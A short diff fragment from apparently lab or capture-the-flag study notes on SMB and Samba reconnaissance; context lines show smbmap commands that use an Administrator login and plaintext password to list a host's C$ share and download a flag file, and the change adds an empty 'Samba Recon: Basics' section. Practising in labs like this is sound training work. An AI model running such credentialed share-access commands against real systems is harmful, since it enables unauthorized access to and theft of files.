@@ -105,6 +105,12 @@ smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
 smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
 cat /root/10.0.28.123-C_flag.txt
 ```
+09)  Samba Recon: Basics
+
+```
+
+
+```
 
 
 
